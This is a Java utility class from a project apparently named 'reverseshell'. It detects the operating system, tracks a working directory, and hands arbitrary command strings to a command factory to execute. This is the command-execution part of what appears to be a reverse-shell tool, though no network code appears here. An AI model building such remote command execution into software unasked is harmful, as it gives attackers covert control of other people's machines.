package com.mtattab.reverseshell.util;

import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.service.factory.CommandFactory;
import lombok.experimental.UtilityClass;
import lombok.extern.java.Log;

import java.io.*;


@UtilityClass
@Log
public class SystemCommandUtil {

    public static boolean isWindows = System.getProperty("os.name").toLowerCase().startsWith("windows");
    public static boolean runPowerShell = false;

    public static File currentWorkingDir = new File(System.getProperty("user.dir"));


    public static String runCommand(String command)  {

        try {
            Command commandToExecute = CommandFactory.createCommand(command);

            return commandToExecute.executeCommand(command);
        }catch (Exception e){
            return e.getMessage();
        }



    }



}
